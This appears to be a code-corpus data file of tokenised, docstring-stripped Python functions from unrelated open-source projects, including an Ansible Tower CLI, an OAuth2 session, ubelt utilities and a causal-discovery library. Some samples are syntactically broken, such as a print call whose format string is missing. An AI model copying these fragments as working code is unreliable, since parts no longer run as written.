def _disassoc ( self , url_fragment , me , other ) : # Get the endpoint for foreign records within this object. url = self . endpoint + '%d/%s/' % ( me , url_fragment ) # Attempt to determine whether the other record already is absent, for the "changed" moniker. r = client . get ( url , params = { 'id' : other } ) . json ( ) if r [ 'count' ] == 0 : return { 'changed' : False } # Send a request removing the foreign record from this one. r = client . post ( url , data = { 'disassociate' : True , 'id' : other } ) return { 'changed' : True }
def last_job_data ( self , pk = None , * * kwargs ) : ujt = self . get ( pk , include_debug_header = True , * * kwargs ) # Determine the appropriate inventory source update. if 'current_update' in ujt [ 'related' ] : debug . log ( 'A current job; retrieving it.' , header = 'details' ) return client . get ( ujt [ 'related' ] [ 'current_update' ] [ 7 : ] ) . json ( ) elif ujt [ 'related' ] . get ( 'last_update' , None ) : debug . log ( 'No current job or update exists; retrieving the most recent.' , header = 'details' ) return client . get ( ujt [ 'related' ] [ 'last_update' ] [ 7 : ] ) . json ( ) else : raise exc . NotFound ( 'No related jobs or updates exist.' )
def lookup_stdout ( self , pk = None , start_line = None , end_line = None , full = True ) : stdout_url = '%s%s/stdout/' % ( self . unified_job_type , pk ) payload = { 'format' : 'json' , 'content_encoding' : 'base64' , 'content_format' : 'ansi' } if start_line : payload [ 'start_line' ] = start_line if end_line : payload [ 'end_line' ] = end_line debug . log ( 'Requesting a copy of job standard output' , header = 'details' ) resp = client . get ( stdout_url , params = payload ) . json ( ) content = b64decode ( resp [ 'content' ] ) return content . decode ( 'utf-8' , 'replace' )
def version ( ) : # Print out the current version of Tower CLI. click . echo ( 'Tower CLI %s' % __version__ ) # Print out the current API version of the current code base. click . echo ( 'API %s' % CUR_API_VERSION ) # Attempt to connect to the Ansible Tower server. # If we succeed, print a version; if not, generate a failure. try : r = client . get ( '/config/' ) except RequestException as ex : raise exc . TowerCLIError ( 'Could not connect to Ansible Tower.\n%s' % six . text_type ( ex ) ) config = r . json ( ) license = config . get ( 'license_info' , { } ) . get ( 'license_type' , 'open' ) if license == 'open' : server_type = 'AWX' else : server_type = 'Ansible Tower' click . echo ( '%s %s' % ( server_type , config [ 'version' ] ) ) # Print out Ansible version of server click . echo ( 'Ansible %s' % config [ 'ansible_version' ] )
def _echo_setting ( key ) : value = getattr ( settings , key ) secho ( '%s: ' % key , fg = 'magenta' , bold = True , nl = False ) secho ( six . text_type ( value ) , bold = True , fg = 'white' if isinstance ( value , six . text_type ) else 'cyan' , )
def login ( username , password , scope , client_id , client_secret , verbose ) : if not supports_oauth ( ) : raise exc . TowerCLIError ( 'This version of Tower does not support OAuth2.0. Set credentials using tower-cli config.' ) # Explicitly set a basic auth header for PAT acquisition (so that we don't # try to auth w/ an existing user+pass or oauth2 token in a config file) req = collections . namedtuple ( 'req' , 'headers' ) ( { } ) if client_id and client_secret : HTTPBasicAuth ( client_id , client_secret ) ( req ) req . headers [ 'Content-Type' ] = 'application/x-www-form-urlencoded' r = client . post ( '/o/token/' , data = { "grant_type" : "password" , "username" : username , "password" : password , "scope" : scope } , headers = req . headers ) elif client_id : req . headers [ 'Content-Type' ] = 'application/x-www-form-urlencoded' r = client . post ( '/o/token/' , data = { "grant_type" : "password" , "username" : username , "password" : password , "client_id" : client_id , "scope" : scope } , headers = req . headers ) else : HTTPBasicAuth ( username , password ) ( req ) r = client . post ( '/users/{}/personal_tokens/' . format ( username ) , data = { "description" : "Tower CLI" , "application" : None , "scope" : scope } , headers = req . headers ) if r . ok : result = r . json ( ) result . pop ( 'summary_fields' , None ) result . pop ( 'related' , None ) if client_id : token = result . pop ( 'access_token' , None ) else : token = result . pop ( 'token' , None ) if settings . verbose : # only print the actual token if -v result [ 'token' ] = token secho ( json . dumps ( result , indent = 1 ) , fg = 'blue' , bold = True ) config . main ( [ 'oauth_token' , token , '--scope=user' ] )
def convert ( self , value , param , ctx ) : # Protect against corner cases of invalid inputs if not isinstance ( value , str ) : return value if isinstance ( value , six . binary_type ) : value = value . decode ( 'UTF-8' ) # Read from a file under these cases if value . startswith ( '@' ) : filename = os . path . expanduser ( value [ 1 : ] ) file_obj = super ( Variables , self ) . convert ( filename , param , ctx ) if hasattr ( file_obj , 'read' ) : # Sometimes click.File may return a buffer and not a string return file_obj . read ( ) return file_obj # No file, use given string return value
def set_display_columns ( self , set_true = [ ] , set_false = [ ] ) : for i in range ( len ( self . fields ) ) : if self . fields [ i ] . name in set_true : self . fields [ i ] . display = True elif self . fields [ i ] . name in set_false : self . fields [ i ] . display = False
def _separate ( self , kwargs ) : self . _pop_none ( kwargs ) result = { } for field in Resource . config_fields : if field in kwargs : result [ field ] = kwargs . pop ( field ) if field in Resource . json_fields : # If result[field] is not a string we can continue on if not isinstance ( result [ field ] , six . string_types ) : continue try : data = json . loads ( result [ field ] ) result [ field ] = data except ValueError : raise exc . TowerCLIError ( 'Provided json file format ' 'invalid. Please recheck.' ) return result
def _format_id ( self , payload ) : if 'id' in payload : return str ( payload [ 'id' ] ) if 'results' in payload : return ' ' . join ( [ six . text_type ( item [ 'id' ] ) for item in payload [ 'results' ] ] ) raise MultipleRelatedError ( 'Could not serialize output with id format.' )
def list_resource_commands ( self ) : resource_path = os . path . abspath ( os . path . join ( os . path . dirname ( __file__ ) , os . pardir , 'resources' ) ) answer = set ( [ ] ) for _ , name , _ in pkgutil . iter_modules ( [ resource_path ] ) : res = tower_cli . get_resource ( name ) if not getattr ( res , 'internal' , False ) : answer . add ( name ) return sorted ( answer )
def new_state ( self ) : try : self . _state = self . state ( ) log . debug ( "Generated new state %s." , self . _state ) except TypeError : self . _state = self . state log . debug ( "Re-using previously supplied state %s." , self . _state ) return self . _state
def request ( self , method , url , data = None , headers = None , withhold_token = False , client_id = None , client_secret = None , * * kwargs ) : if not is_secure_transport ( url ) : raise InsecureTransportError ( ) if self . token and not withhold_token : log . debug ( "Invoking %d protected resource request hooks." , len ( self . compliance_hook [ "protected_request" ] ) , ) for hook in self . compliance_hook [ "protected_request" ] : log . debug ( "Invoking hook %s." , hook ) url , headers , data = hook ( url , headers , data ) log . debug ( "Adding token %s to request." , self . token ) try : url , headers , data = self . _client . add_token ( url , http_method = method , body = data , headers = headers ) # Attempt to retrieve and save new access token if expired except TokenExpiredError : if self . auto_refresh_url : log . debug ( "Auto refresh is set, attempting to refresh at %s." , self . auto_refresh_url , ) # We mustn't pass auth twice. auth = kwargs . pop ( "auth" , None ) if client_id and client_secret and ( auth is None ) : log . debug ( 'Encoding client_id "%s" with client_secret as Basic auth credentials.' , client_id , ) auth = requests . auth . HTTPBasicAuth ( client_id , client_secret ) token = self . refresh_token ( self . auto_refresh_url , auth = auth , * * kwargs ) if self . token_updater : log . debug ( "Updating token to %s using %s." , token , self . token_updater ) self . token_updater ( token ) url , headers , data = self . _client . add_token ( url , http_method = method , body = data , headers = headers ) else : raise TokenUpdated ( token ) else : raise log . debug ( "Requesting url %s using method %s." , url , method ) log . debug ( "Supplying headers %s and data %s" , headers , data ) log . debug ( "Passing through key word arguments %s." , kwargs ) return super ( OAuth2Session , self ) . request ( method , url , headers = headers , data = data , * * kwargs )
def clear ( self , cfgstr = None ) : data_fpath = self . get_fpath ( cfgstr ) if self . verbose > 0 : self . log ( '[cacher] clear cache' ) if exists ( data_fpath ) : if self . verbose > 0 : self . log ( '[cacher] removing {}' . format ( data_fpath ) ) os . remove ( data_fpath ) # Remove the metadata if it exists meta_fpath = data_fpath + '.meta' if exists ( meta_fpath ) : os . remove ( meta_fpath ) else : if self . verbose > 0 : self . log ( '[cacher] ... nothing to clear' )
def _get_certificate ( self , cfgstr = None ) : certificate = self . cacher . tryload ( cfgstr = cfgstr ) return certificate
def _rectify_products ( self , product = None ) : products = self . product if product is None else product if products is None : return None if not isinstance ( products , ( list , tuple ) ) : products = [ products ] return products
def _product_file_hash ( self , product = None ) : if self . hasher is None : return None else : products = self . _rectify_products ( product ) product_file_hash = [ util_hash . hash_file ( p , hasher = self . hasher , base = 'hex' ) for p in products ] return product_file_hash
def write ( self , msg ) : if self . redirect is not None : self . redirect . write ( msg ) if six . PY2 : from xdoctest . utils . util_str import ensure_unicode msg = ensure_unicode ( msg ) super ( TeeStringIO , self ) . write ( msg )
def flush ( self ) : # nocover if self . redirect is not None : self . redirect . flush ( ) super ( TeeStringIO , self ) . flush ( )
def log_part ( self ) : self . cap_stdout . seek ( self . _pos ) text = self . cap_stdout . read ( ) self . _pos = self . cap_stdout . tell ( ) self . parts . append ( text ) self . text = text
def _join_itemstrs ( itemstrs , itemsep , newlines , _leaf_info , nobraces , trailing_sep , compact_brace , lbr , rbr ) : # positive newlines means start counting from the root use_newline = newlines > 0 # negative countdown values mean start counting from the leafs # if compact_brace < 0: #     compact_brace = (-compact_brace) >= _leaf_info['max_height'] if newlines < 0 : use_newline = ( - newlines ) < _leaf_info [ 'max_height' ] if use_newline : sep = ',\n' if nobraces : body_str = sep . join ( itemstrs ) if trailing_sep and len ( itemstrs ) > 0 : body_str += ',' retstr = body_str else : if compact_brace : # Why must we modify the indentation below and not here? # prefix = '' # rest = [ub.indent(s, prefix) for s in itemstrs[1:]] # indented = itemstrs[0:1] + rest indented = itemstrs else : import ubelt as ub prefix = ' ' * 4 indented = [ ub . indent ( s , prefix ) for s in itemstrs ] body_str = sep . join ( indented ) if trailing_sep and len ( itemstrs ) > 0 : body_str += ',' if compact_brace : # Why can we modify the indentation here but not above? braced_body_str = ( lbr + body_str . replace ( '\n' , '\n ' ) + rbr ) else : braced_body_str = ( lbr + '\n' + body_str + '\n' + rbr ) retstr = braced_body_str else : sep = ',' + itemsep body_str = sep . join ( itemstrs ) if trailing_sep and len ( itemstrs ) > 0 : body_str += ',' retstr = ( lbr + body_str + rbr ) return retstr
def _list_itemstrs ( list_ , * * kwargs ) : items = list ( list_ ) kwargs [ '_return_info' ] = True _tups = [ repr2 ( item , * * kwargs ) for item in items ] itemstrs = [ t [ 0 ] for t in _tups ] max_height = max ( [ t [ 1 ] [ 'max_height' ] for t in _tups ] ) if _tups else 0 _leaf_info = { 'max_height' : max_height + 1 , } sort = kwargs . get ( 'sort' , None ) if sort is None : # Force orderings on sets. sort = isinstance ( list_ , ( set , frozenset ) ) if sort : itemstrs = _sort_itemstrs ( items , itemstrs ) return itemstrs , _leaf_info
def register ( self , type ) : def _decorator ( func ) : if isinstance ( type , tuple ) : for t in type : self . func_registry [ t ] = func else : self . func_registry [ type ] = func return func return _decorator
def _register_numpy_extensions ( self ) : # system checks import numpy as np numpy_floating_types = ( np . float16 , np . float32 , np . float64 ) if hasattr ( np , 'float128' ) : # nocover numpy_floating_types = numpy_floating_types + ( np . float128 , ) @ self . add_iterable_check def is_object_ndarray ( data ) : # ndarrays of objects cannot be hashed directly. return isinstance ( data , np . ndarray ) and data . dtype . kind == 'O' @ self . register ( np . ndarray ) def hash_numpy_array ( data ) : if data . dtype . kind == 'O' : msg = 'directly hashing ndarrays with dtype=object is unstable' raise TypeError ( msg ) else : # tobytes() views the array in 1D (via ravel()) # encode the shape as well header = b'' . join ( _hashable_sequence ( ( len ( data . shape ) , data . shape ) ) ) dtype = b'' . join ( _hashable_sequence ( data . dtype . descr ) ) hashable = header + dtype + data . tobytes ( ) prefix = b'NDARR' return prefix , hashable @ self . register ( ( np . int64 , np . int32 , np . int16 , np . int8 ) + ( np . uint64 , np . uint32 , np . uint16 , np . uint8 ) ) def _hash_numpy_int ( data ) : return _convert_to_hashable ( int ( data ) ) @ self . register ( numpy_floating_types ) def _hash_numpy_float ( data ) : return _convert_to_hashable ( float ( data ) ) @ self . register ( np . random . RandomState ) def _hash_numpy_random_state ( data ) : hashable = b'' . join ( _hashable_sequence ( data . get_state ( ) ) ) prefix = b'RNG' return prefix , hashable
def _proc_async_iter_stream ( proc , stream , buffersize = 1 ) : from six . moves import queue from threading import Thread def enqueue_output ( proc , stream , stream_queue ) : while proc . poll ( ) is None : line = stream . readline ( ) # print('ENQUEUE LIVE {!r} {!r}'.format(stream, line)) stream_queue . put ( line ) for line in _textio_iterlines ( stream ) : # print('ENQUEUE FINAL {!r} {!r}'.format(stream, line)) stream_queue . put ( line ) # print("STREAM IS DONE {!r}".format(stream)) stream_queue . put ( None ) # signal that the stream is finished # stream.close() stream_queue = queue . Queue ( maxsize = buffersize ) _thread = Thread ( target = enqueue_output , args = ( proc , stream , stream_queue ) ) _thread . daemon = True # thread dies with the program _thread . start ( ) return stream_queue
def _extension_module_tags ( ) : import sysconfig tags = [ ] if six . PY2 : # see also 'SHLIB_EXT' multiarch = sysconfig . get_config_var ( 'MULTIARCH' ) if multiarch is not None : tags . append ( multiarch ) else : # handle PEP 3149 -- ABI version tagged .so files # ABI = application binary interface tags . append ( sysconfig . get_config_var ( 'SOABI' ) ) tags . append ( 'abi3' ) # not sure why this one is valid but it is tags = [ t for t in tags if t ] return tags
def _symlink ( path , link , overwrite = 0 , verbose = 0 ) : if exists ( link ) and not os . path . islink ( link ) : # On windows a broken link might still exist as a hard link or a # junction. Overwrite it if it is a file and we cannot symlink. # However, if it is a non-junction directory then do not overwrite if verbose : print ( 'link location already exists' ) is_junc = _win32_is_junction ( link ) # NOTE: # in python2 broken junctions are directories and exist # in python3 broken junctions are directories and do not exist if os . path . isdir ( link ) : if is_junc : pointed = _win32_read_junction ( link ) if path == pointed : if verbose : print ( '...and is a junction that points to the same place' ) return link else : if verbose : if not exists ( pointed ) : print ( '...and is a broken junction that points somewhere else' ) else : print ( '...and is a junction that points somewhere else' ) else : if verbose : print ( '...and is an existing real directory!' ) raise IOError ( 'Cannot overwrite a real directory' ) elif os . path . isfile ( link ) : if _win32_is_hardlinked ( link , path ) : if verbose : print ( '...and is a hard link that points to the same place' ) return link else : if verbose : print ( '...and is a hard link that points somewhere else' ) if _win32_can_symlink ( ) : raise IOError ( 'Cannot overwrite potentially real file if we can symlink' ) if overwrite : if verbose : print ( '...overwriting' ) util_io . delete ( link , verbose > 1 ) else : if exists ( link ) : raise IOError ( 'Link already exists' ) _win32_symlink2 ( path , link , verbose = verbose )
def _win32_dir ( path , star = '' ) : from ubelt import util_cmd import re wrapper = 'cmd /S /C "{}"' # the /S will preserve all inner quotes command = 'dir /-C "{}"{}' . format ( path , star ) wrapped = wrapper . format ( command ) info = util_cmd . cmd ( wrapped , shell = True ) if info [ 'ret' ] != 0 : from ubelt import util_format print ( 'Failed command:' ) print ( info [ 'command' ] ) print ( util_format . repr2 ( info , nl = 1 ) ) raise OSError ( str ( info ) ) # parse the output of dir to get some info # Remove header and footer lines = info [ 'out' ] . split ( '\n' ) [ 5 : - 3 ] splitter = re . compile ( '( +)' ) for line in lines : parts = splitter . split ( line ) date , sep , time , sep , ampm , sep , type_or_size , sep = parts [ : 8 ] name = '' . join ( parts [ 8 : ] ) # if type is a junction then name will also contain the linked loc if name == '.' or name == '..' : continue if type_or_size in [ '<JUNCTION>' , '<SYMLINKD>' , '<SYMLINK>' ] : # colons cannot be in path names, so use that to find where # the name ends pos = name . find ( ':' ) bpos = name [ : pos ] . rfind ( '[' ) name = name [ : bpos - 1 ] pointed = name [ bpos + 1 : - 1 ] yield type_or_size , name , pointed else : yield type_or_size , name , None
def parse ( config ) : if not isinstance ( config , basestring ) : raise TypeError ( "Contains input must be a simple string" ) validator = ContainsValidator ( ) validator . contains_string = config return validator
def retrieve_adjacency_matrix ( graph , order_nodes = None , weight = False ) : if isinstance ( graph , np . ndarray ) : return graph elif isinstance ( graph , nx . DiGraph ) : if order_nodes is None : order_nodes = graph . nodes ( ) if not weight : return np . array ( nx . adjacency_matrix ( graph , order_nodes , weight = None ) . todense ( ) ) else : return np . array ( nx . adjacency_matrix ( graph , order_nodes ) . todense ( ) ) else : raise TypeError ( "Only networkx.DiGraph and np.ndarray (adjacency matrixes) are supported." )
def init_variables ( self , verbose = False ) : for j in range ( 1 , self . nodes ) : nb_parents = np . random . randint ( 0 , min ( [ self . parents_max , j ] ) + 1 ) for i in np . random . choice ( range ( 0 , j ) , nb_parents , replace = False ) : self . adjacency_matrix [ i , j ] = 1 try : self . g = nx . DiGraph ( self . adjacency_matrix ) assert not list ( nx . simple_cycles ( self . g ) ) except AssertionError : if verbose : print ( "Regenerating, graph non valid..." ) self . init_variables ( ) # Mechanisms self . cfunctions = [ self . mechanism ( int ( sum ( self . adjacency_matrix [ : , i ] ) ) , self . points , self . noise , noise_coeff = self . noise_coeff ) if sum ( self . adjacency_matrix [ : , i ] ) else self . initial_generator for i in range ( self . nodes ) ]
def generate ( self , rescale = True ) : if self . cfunctions is None : self . init_variables ( ) for i in nx . topological_sort ( self . g ) : # Root cause if not sum ( self . adjacency_matrix [ : , i ] ) : self . data [ 'V{}' . format ( i ) ] = self . cfunctions [ i ] ( self . points ) # Generating causes else : self . data [ 'V{}' . format ( i ) ] = self . cfunctions [ i ] ( self . data . iloc [ : , self . adjacency_matrix [ : , i ] . nonzero ( ) [ 0 ] ] . values ) if rescale : self . data [ 'V{}' . format ( i ) ] = scale ( self . data [ 'V{}' . format ( i ) ] . values ) return self . g , self . data
def graph_evaluation ( data , adj_matrix , gpu = None , gpu_id = 0 , * * kwargs ) : gpu = SETTINGS . get_default ( gpu = gpu ) device = 'cuda:{}' . format ( gpu_id ) if gpu else 'cpu' obs = th . FloatTensor ( data ) . to ( device ) cgnn = CGNN_model ( adj_matrix , data . shape [ 0 ] , gpu_id = gpu_id , * * kwargs ) . to ( device ) cgnn . reset_parameters ( ) return cgnn . run ( obs , * * kwargs )
def parallel_graph_evaluation ( data , adj_matrix , nb_runs = 16 , nb_jobs = None , * * kwargs ) : nb_jobs = SETTINGS . get_default ( nb_jobs = nb_jobs ) if nb_runs == 1 : return graph_evaluation ( data , adj_matrix , * * kwargs ) else : output = Parallel ( n_jobs = nb_jobs ) ( delayed ( graph_evaluation ) ( data , adj_matrix , idx = run , gpu_id = run % SETTINGS . GPU , * * kwargs ) for run in range ( nb_runs ) ) return np . mean ( output )
def forward ( self ) : self . noise . data . normal_ ( ) if not self . confounding : for i in self . topological_order : self . generated [ i ] = self . blocks [ i ] ( th . cat ( [ v for c in [ [ self . generated [ j ] for j in np . nonzero ( self . adjacency_matrix [ : , i ] ) [ 0 ] ] , [ self . noise [ : , [ i ] ] ] ] for v in c ] , 1 ) ) else : for i in self . topological_order : self . generated [ i ] = self . blocks [ i ] ( th . cat ( [ v for c in [ [ self . generated [ j ] for j in np . nonzero ( self . adjacency_matrix [ : , i ] ) [ 0 ] ] , [ self . corr_noise [ min ( i , j ) , max ( i , j ) ] for j in np . nonzero ( self . i_adj_matrix [ : , i ] ) [ 0 ] ] [ self . noise [ : , [ i ] ] ] ] for v in c ] , 1 ) ) return th . cat ( self . generated , 1 )
def run ( self , data , train_epochs = 1000 , test_epochs = 1000 , verbose = None , idx = 0 , lr = 0.01 , * * kwargs ) : verbose = SETTINGS . get_default ( verbose = verbose ) optim = th . optim . Adam ( self . parameters ( ) , lr = lr ) self . score . zero_ ( ) with trange ( train_epochs + test_epochs , disable = not verbose ) as t : for epoch in t : optim . zero_grad ( ) generated_data = self . forward ( ) mmd = self . criterion ( generated_data , data ) if not epoch % 200 : t . set_postfix ( idx = idx , epoch = epoch , loss = mmd . item ( ) ) mmd . backward ( ) optim . step ( ) if epoch >= test_epochs : self . score . add_ ( mmd . data ) return self . score . cpu ( ) . numpy ( ) / test_epochs
def _run_gies ( self , data , fixedGaps = None , verbose = True ) : # Run gies id = str ( uuid . uuid4 ( ) ) os . makedirs ( '/tmp/cdt_gies' + id + '/' ) self . arguments [ '{FOLDER}' ] = '/tmp/cdt_gies' + id + '/' def retrieve_result ( ) : return read_csv ( '/tmp/cdt_gies' + id + '/result.csv' , delimiter = ',' ) . values try : data . to_csv ( '/tmp/cdt_gies' + id + '/data.csv' , header = False , index = False ) if fixedGaps is not None : fixedGaps . to_csv ( '/tmp/cdt_gies' + id + '/fixedgaps.csv' , index = False , header = False ) self . arguments [ '{SKELETON}' ] = 'TRUE' else : self . arguments [ '{SKELETON}' ] = 'FALSE' gies_result = launch_R_script ( "{}/R_templates/gies.R" . format ( os . path . dirname ( os . path . realpath ( __file__ ) ) ) , self . arguments , output_function = retrieve_result , verbose = verbose ) # Cleanup except Exception as e : rmtree ( '/tmp/cdt_gies' + id + '' ) raise e except KeyboardInterrupt : rmtree ( '/tmp/cdt_gies' + id + '/' ) raise KeyboardInterrupt rmtree ( '/tmp/cdt_gies' + id + '' ) return gies_result
def plot_curves ( i_batch , adv_loss , gen_loss , l1_reg , cols ) : from matplotlib import pyplot as plt if i_batch == 0 : try : ax . clear ( ) ax . plot ( range ( len ( adv_plt ) ) , adv_plt , "r-" , linewidth = 1.5 , markersize = 4 , label = "Discriminator" ) ax . plot ( range ( len ( adv_plt ) ) , gen_plt , "g-" , linewidth = 1.5 , markersize = 4 , label = "Generators" ) ax . plot ( range ( len ( adv_plt ) ) , l1_plt , "b-" , linewidth = 1.5 , markersize = 4 , label = "L1-Regularization" ) plt . legend ( ) adv_plt . append ( adv_loss . cpu ( ) . data [ 0 ] ) gen_plt . append ( gen_loss . cpu ( ) . data [ 0 ] / cols ) l1_plt . append ( l1_reg . cpu ( ) . data [ 0 ] ) plt . pause ( 0.0001 ) except NameError : plt . ion ( ) fig , ax = plt . figure ( ) plt . xlabel ( "Epoch" ) plt . ylabel ( "Losses" ) plt . pause ( 0.0001 ) adv_plt = [ adv_loss . cpu ( ) . data [ 0 ] ] gen_plt = [ gen_loss . cpu ( ) . data [ 0 ] / cols ] l1_plt = [ l1_reg . cpu ( ) . data [ 0 ] ] else : adv_plt . append ( adv_loss . cpu ( ) . data [ 0 ] ) gen_plt . append ( gen_loss . cpu ( ) . data [ 0 ] / cols ) l1_plt . append ( l1_reg . cpu ( ) . data [ 0 ] )
def plot_gen ( epoch , batch , generated_variables , pairs_to_plot = [ [ 0 , 1 ] ] ) : from matplotlib import pyplot as plt if epoch == 0 : plt . ion ( ) plt . clf ( ) for ( i , j ) in pairs_to_plot : plt . scatter ( generated_variables [ i ] . data . cpu ( ) . numpy ( ) , batch . data . cpu ( ) . numpy ( ) [ : , j ] , label = "Y -> X" ) plt . scatter ( batch . data . cpu ( ) . numpy ( ) [ : , i ] , generated_variables [ j ] . data . cpu ( ) . numpy ( ) , label = "X -> Y" ) plt . scatter ( batch . data . cpu ( ) . numpy ( ) [ : , i ] , batch . data . cpu ( ) . numpy ( ) [ : , j ] , label = "original data" ) plt . legend ( ) plt . pause ( 0.01 )
def reset_parameters ( self ) : stdv = 1. / math . sqrt ( self . weight . size ( 1 ) ) self . weight . data . uniform_ ( - stdv , stdv ) if self . bias is not None : self . bias . data . uniform_ ( - stdv , stdv )
def forward ( self , input ) : return th . nn . functional . linear ( input , self . weight . div ( self . weight . pow ( 2 ) . sum ( 0 ) . sqrt ( ) ) )
def forward ( self , x ) : return self . layers ( x * ( self . _filter * self . fs_filter ) . expand_as ( x ) )
def forward ( self , x ) : for i in self . noise : i . data . normal_ ( ) self . generated_variables = [ self . blocks [ i ] ( th . cat ( [ x , self . noise [ i ] ] , 1 ) ) for i in range ( self . cols ) ] return self . generated_variables
def _run_pc ( self , data , fixedEdges = None , fixedGaps = None , verbose = True ) : # Checking coherence of arguments # print(self.arguments) if ( self . arguments [ '{CITEST}' ] == self . dir_CI_test [ 'hsic' ] and self . arguments [ '{METHOD_INDEP}' ] == self . dir_method_indep [ 'corr' ] ) : warnings . warn ( 'Selected method for indep is unfit for the hsic test,' ' setting the hsic.gamma method.' ) self . arguments [ '{METHOD_INDEP}' ] = self . dir_method_indep [ 'hsic_gamma' ] elif ( self . arguments [ '{CITEST}' ] == self . dir_CI_test [ 'gaussian' ] and self . arguments [ '{METHOD_INDEP}' ] != self . dir_method_indep [ 'corr' ] ) : warnings . warn ( 'Selected method for indep is unfit for the selected test,' ' setting the classic correlation-based method.' ) self . arguments [ '{METHOD_INDEP}' ] = self . dir_method_indep [ 'corr' ] # Run PC id = str ( uuid . uuid4 ( ) ) os . makedirs ( '/tmp/cdt_pc' + id + '/' ) self . arguments [ '{FOLDER}' ] = '/tmp/cdt_pc' + id + '/' def retrieve_result ( ) : return read_csv ( '/tmp/cdt_pc' + id + '/result.csv' , delimiter = ',' ) . values try : data . to_csv ( '/tmp/cdt_pc' + id + '/data.csv' , header = False , index = False ) if fixedGaps is not None and fixedEdges is not None : fixedGaps . to_csv ( '/tmp/cdt_pc' + id + '/fixedgaps.csv' , index = False , header = False ) fixedEdges . to_csv ( '/tmp/cdt_pc' + id + '/fixededges.csv' , index = False , header = False ) self . arguments [ '{SKELETON}' ] = 'TRUE' else : self . arguments [ '{SKELETON}' ] = 'FALSE' pc_result = launch_R_script ( "{}/R_templates/pc.R" . format ( os . path . dirname ( os . path . realpath ( __file__ ) ) ) , self . arguments , output_function = retrieve_result , verbose = verbose ) # Cleanup except Exception as e : rmtree ( '/tmp/cdt_pc' + id + '' ) raise e except KeyboardInterrupt : rmtree ( '/tmp/cdt_pc' + id + '/' ) raise KeyboardInterrupt rmtree ( '/tmp/cdt_pc' + id + '' ) return pc_result
def computeGaussKernel ( x ) : xnorm = np . power ( euclidean_distances ( x , x ) , 2 ) return np . exp ( - xnorm / ( 2.0 ) )
def normal_noise ( points ) : return np . random . rand ( 1 ) * np . random . randn ( points , 1 ) + random . sample ( [ 2 , - 2 ] , 1 )
def uniform_noise ( points ) : return np . random . rand ( 1 ) * np . random . uniform ( points , 1 ) + random . sample ( [ 2 , - 2 ] , 1 )
def run ( self , x , y , lr = 0.01 , train_epochs = 1000 , test_epochs = 1000 , idx = 0 , verbose = None , * * kwargs ) : verbose = SETTINGS . get_default ( verbose = verbose ) optim = th . optim . Adam ( self . parameters ( ) , lr = lr ) running_loss = 0 teloss = 0 for i in range ( train_epochs + test_epochs ) : optim . zero_grad ( ) pred = self . forward ( x ) loss = self . criterion ( pred , y ) running_loss += loss . item ( ) if i < train_epochs : loss . backward ( ) optim . step ( ) else : teloss += running_loss # print statistics if verbose and not i % 300 : print ( 'Idx:{}; epoch:{}; score:{}' . format ( idx , i , running_loss / 300 ) ) running_loss = 0.0 return teloss / test_epochs
def init_variables ( self , verbose = False ) : # Resetting adjacency matrix for i in range ( self . nodes ) : for j in np . random . choice ( range ( self . nodes ) , np . random . randint ( 0 , self . parents_max + 1 ) , replace = False ) : if i != j : self . adjacency_matrix [ j , i ] = 1 try : assert any ( [ sum ( self . adjacency_matrix [ : , i ] ) == self . parents_max for i in range ( self . nodes ) ] ) self . g = nx . DiGraph ( self . adjacency_matrix ) assert list ( nx . simple_cycles ( self . g ) ) assert any ( len ( i ) == 2 for i in nx . simple_cycles ( self . g ) ) except AssertionError : if verbose : print ( "Regenerating, graph non valid..." ) self . init_variables ( ) if verbose : print ( . format ( len ( list ( nx . simple_cycles ( self . g ) ) ) ) ) for i in range ( self . nodes ) : self . data . iloc [ : , i ] = scale ( self . initial_generator ( self . points ) ) # Mechanisms self . cfunctions = [ self . mechanism ( int ( sum ( self . adjacency_matrix [ : , i ] ) ) , self . points , self . noise , noise_coeff = self . noise_coeff ) for i in range ( self . nodes ) ]
def generate ( self , nb_steps = 100 , averaging = 50 , rescale = True ) : if self . cfunctions is None : self . init_variables ( ) new_df = pd . DataFrame ( ) causes = [ [ c for c in np . nonzero ( self . adjacency_matrix [ : , j ] ) [ 0 ] ] for j in range ( self . nodes ) ] values = [ [ ] for i in range ( self . nodes ) ] for i in range ( nb_steps ) : for j in range ( self . nodes ) : new_df [ "V" + str ( j ) ] = self . cfunctions [ j ] ( self . data . iloc [ : , causes [ j ] ] . values ) [ : , 0 ] if rescale : new_df [ "V" + str ( j ) ] = scale ( new_df [ "V" + str ( j ) ] ) if i > nb_steps - averaging : values [ j ] . append ( new_df [ "V" + str ( j ) ] ) self . data = new_df self . data = pd . DataFrame ( np . array ( [ np . mean ( values [ i ] , axis = 0 ) for i in range ( self . nodes ) ] ) . transpose ( ) , columns = [ "V{}" . format ( j ) for j in range ( self . nodes ) ] ) return self . g , self . data
def phrase_to_filename ( self , phrase ) : # remove non-word characters name = re . sub ( r"[^\w\s\.]" , '' , phrase . strip ( ) . lower ( ) ) # replace whitespace with underscores name = re . sub ( r"\s+" , '_' , name ) return name + '.png'
def wait_for_page_to_load ( self ) : self . wait . until ( lambda _ : self . loaded ) self . pm . hook . pypom_after_wait_for_page_to_load ( page = self ) return self
def wait_for_region_to_load ( self ) : self . wait . until ( lambda _ : self . loaded ) self . pm . hook . pypom_after_wait_for_region_to_load ( region = self ) return self
def registerDriver ( iface , driver , class_implements = [ ] ) : for class_item in class_implements : classImplements ( class_item , iface ) component . provideAdapter ( factory = driver , adapts = [ iface ] , provides = IDriver )
def _pre_install ( ) : # Generate the parsetab.dat file at setup time dat = join ( setup_dir , 'src' , 'hcl' , 'parsetab.dat' ) if exists ( dat ) : os . unlink ( dat ) sys . path . insert ( 0 , join ( setup_dir , 'src' ) ) import hcl from hcl . parser import HclParser parser = HclParser ( )
def append ( self , linenumber , raw_text , cells ) : self . rows . append ( Row ( linenumber , raw_text , cells ) )
def is_comment ( self ) : for cell in self [ : ] : if cell == "" : continue # this is the first non-empty cell. Check whether it is # a comment or not. if cell . lstrip ( ) . startswith ( "#" ) : return True else : return False return False
def keywords ( self ) : for table in self . tables : if isinstance ( table , KeywordTable ) : for keyword in table . keywords : yield keyword
def dump ( self ) : for table in self . tables : print ( "*** %s ***" % table . name ) table . dump ( )
def settings ( self ) : for table in self . tables : if isinstance ( table , SettingTable ) : for statement in table . statements : yield statement
def variables ( self ) : for table in self . tables : if isinstance ( table , VariableTable ) : # FIXME: settings have statements, variables have rows WTF? :-( for statement in table . rows : if statement [ 0 ] != "" : yield statement
def report ( self , obj , message , linenum , char_offset = 0 ) : self . controller . report ( linenumber = linenum , filename = obj . path , severity = self . severity , message = message , rulename = self . __class__ . __name__ , char = char_offset )
